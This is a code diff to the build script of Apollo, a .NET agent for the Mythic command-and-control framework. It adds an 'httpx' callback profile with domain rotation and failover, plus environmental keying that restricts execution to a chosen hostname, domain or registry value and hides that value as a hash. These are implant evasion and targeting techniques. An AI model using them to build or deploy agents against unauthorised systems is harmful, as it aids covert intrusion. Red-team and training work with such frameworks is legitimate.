@@ -10,6 +10,7 @@ import traceback
 import shutil
 import json
 import pathlib
+import hashlib
 from mythic_container.MythicRPC import *
 
 
@@ -24,6 +25,7 @@ class Apollo(PayloadType):
     semver = "2.3.51"
     wrapper = False
     wrapped_payloads = ["scarecrow_wrapper", "service_wrapper"]
+    c2_profiles = ["http", "httpx", "smb", "tcp", "websocket"]
     note = """
 A fully featured .NET 4.0 compatible training agent. Version: {}. 
 NOTE: P2P Not compatible with v2.2 agents! 
@@ -42,6 +44,16 @@ NOTE: v2.3.2+ has a different bof loader than 2.3.1 and are incompatible since t
             #    DictionaryChoice(name="User-Agent", default_value="Hello", default_show=True),
             #    DictionaryChoice(name="HostyHost", default_show=False, default_value=""),
             #])
+        },
+        "httpx": {
+            "raw_c2_config": C2ParameterDeviation(supported=True),
+            "callback_domains": C2ParameterDeviation(supported=True),
+            "domain_rotation": C2ParameterDeviation(supported=True),
+            "failover_threshold": C2ParameterDeviation(supported=True),
+            "encrypted_exchange_check": C2ParameterDeviation(supported=True),
+            "callback_jitter": C2ParameterDeviation(supported=True),
+            "callback_interval": C2ParameterDeviation(supported=True),
+            "killdate": C2ParameterDeviation(supported=True),
         }
     }
     build_parameters = [
@@ -85,9 +97,71 @@ NOTE: v2.3.2+ has a different bof loader than 2.3.1 and are incompatible since t
             parameter_type=BuildParameterType.Boolean,
             default_value=False,
             description="Create a DEBUG version.",
+        ),
+        BuildParameter(
+            name="enable_keying",
+            parameter_type=BuildParameterType.Boolean,
+            default_value=False,
+            description="Enable environmental keying to restrict agent execution to specific systems.",
+            group_name="Keying Options",
+        ),
+        BuildParameter(
+            name="keying_method",
+            parameter_type=BuildParameterType.ChooseOne,
+            choices=["Hostname", "Domain", "Registry"],
+            default_value="Hostname",
+            description="Method of environmental keying.",
+            group_name="Keying Options",
+            hide_conditions=[
+                HideCondition(name="enable_keying", operand=HideConditionOperand.NotEQ, value=True)
+            ]
+        ),
+        BuildParameter(
+            name="keying_value",
+            parameter_type=BuildParameterType.String,
+            default_value="",
+            description="The hostname or domain name the agent should match (case-insensitive). Agent will exit if it doesn't match.",
+            group_name="Keying Options",
+            hide_conditions=[
+                HideCondition(name="enable_keying", operand=HideConditionOperand.NotEQ, value=True),
+                HideCondition(name="keying_method", operand=HideConditionOperand.EQ, value="Registry")
+            ]
+        ),
+        BuildParameter(
+            name="registry_path",
+            parameter_type=BuildParameterType.String,
+            default_value="",
+            description="Full registry path (e.g., HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName)",
+            group_name="Keying Options",
+            hide_conditions=[
+                HideCondition(name="enable_keying", operand=HideConditionOperand.NotEQ, value=True),
+                HideCondition(name="keying_method", operand=HideConditionOperand.NotEQ, value="Registry")
+            ]
+        ),
+        BuildParameter(
+            name="registry_value",
+            parameter_type=BuildParameterType.String,
+            default_value="",
+            description="The registry value to check against.",
+            group_name="Keying Options",
+            hide_conditions=[
+                HideCondition(name="enable_keying", operand=HideConditionOperand.NotEQ, value=True),
+                HideCondition(name="keying_method", operand=HideConditionOperand.NotEQ, value="Registry")
+            ]
+        ),
+        BuildParameter(
+            name="registry_comparison",
+            parameter_type=BuildParameterType.ChooseOne,
+            choices=["Matches", "Contains"],
+            default_value="Matches",
+            description="Matches (secure, hash-based) or Contains (WEAK, plaintext comparison). WARNING: Contains mode stores the value in plaintext!",
+            group_name="Keying Options",
+            hide_conditions=[
+                HideCondition(name="enable_keying", operand=HideConditionOperand.NotEQ, value=True),
+                HideCondition(name="keying_method", operand=HideConditionOperand.NotEQ, value="Registry")
+            ]
         )
     ]
-    c2_profiles = ["http", "smb", "tcp", "websocket"]
     agent_path = pathlib.Path(".") / "apollo" / "mythic"
     agent_code_path = pathlib.Path(".") / "apollo" / "agent_code"
     agent_icon_path = agent_path / "agent_functions" / "apollo.svg"
@@ -119,9 +193,60 @@ NOTE: v2.3.2+ has a different bof loader than 2.3.1 and are incompatible since t
                 defines_commands_upper = [f"#define {x.upper()}" for x in resp.updated_command_list]
         else:
             defines_commands_upper = [f"#define {x.upper()}" for x in self.commands.get_commands()]
+        # Handle keying parameters
+        enable_keying = self.get_parameter('enable_keying')
+        keying_enabled = "true" if enable_keying else "false"
+        keying_method_str = self.get_parameter('keying_method') if enable_keying else ""
+        
+        # Map keying method to numeric value for obfuscation
+        # 0 = None, 1 = Hostname, 2 = Domain, 3 = Registry
+        keying_method_map = {
+            "Hostname": "1",
+            "Domain": "2",
+            "Registry": "3"
+        }
+        keying_method = keying_method_map.get(keying_method_str, "0")
+        
+        # Hash the keying value for security (force uppercase before hashing)
+        keying_value_hash = ""
+        registry_path = ""
+        registry_value = ""
+        registry_comparison = "0"  # Default to 0 for numeric field
+        
+        if enable_keying:
+            if keying_method_str == "Registry":
+                # Handle registry keying
+                registry_path = self.get_parameter('registry_path') if self.get_parameter('registry_path') else ""
+                registry_comparison_str = self.get_parameter('registry_comparison') if self.get_parameter('registry_comparison') else "Matches"
+                
+                # Map registry comparison to numeric value: 1 = Matches, 2 = Contains
+                registry_comparison = "1" if registry_comparison_str == "Matches" else "2"
+                
+                registry_value_raw = self.get_parameter('registry_value') if self.get_parameter('registry_value') else ""
+                
+                if registry_comparison_str == "Matches":
+                    # Hash the registry value for secure matching
+                    if registry_value_raw:
+                        plaintext_value = registry_value_raw.upper()
+                        keying_value_hash = hashlib.sha256(plaintext_value.encode('utf-8')).hexdigest()
+                elif registry_comparison_str == "Contains":
+                    # Store plaintext for contains matching (weak security)
+                    registry_value = registry_value_raw
+            else:
+                # Handle hostname/domain keying
+                if self.get_parameter('keying_value'):
+                    plaintext_value = self.get_parameter('keying_value').upper()
+                    keying_value_hash = hashlib.sha256(plaintext_value.encode('utf-8')).hexdigest()
+        
         special_files_map = {
             "Config.cs": {
                 "payload_uuid": self.uuid,
+                "keying_enabled": keying_enabled,
+                "keying_method": keying_method,
+                "keying_value_hash": keying_value_hash,
+                "registry_path": registry_path,
+                "registry_value": registry_value,
+                "registry_comparison": registry_comparison,
             },
         }
         extra_variables = {
@@ -163,6 +288,14 @@ NOTE: v2.3.2+ has a different bof loader than 2.3.1 and are incompatible since t
                     special_files_map["Config.cs"][prefixed_key] = "true" if val else "false"
                 elif isinstance(val, dict):
                     extra_variables = {**extra_variables, **val}
+                elif key == "raw_c2_config" and profile['name'] == "httpx":
+                    # Handle httpx raw_c2_config file parameter
+                    if val and val != "":
+                        # Store the config content for embedding
+                        special_files_map["Config.cs"][prefixed_key] = val
+                    else:
+                        # Use default config
+                        special_files_map["Config.cs"][prefixed_key] = ""
                 else:
                     special_files_map["Config.cs"][prefixed_key] = json.dumps(val)
         try:
